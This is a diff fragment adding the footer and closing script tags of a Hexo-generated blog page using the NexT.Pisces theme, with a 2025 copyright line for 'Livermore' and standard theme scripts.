+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
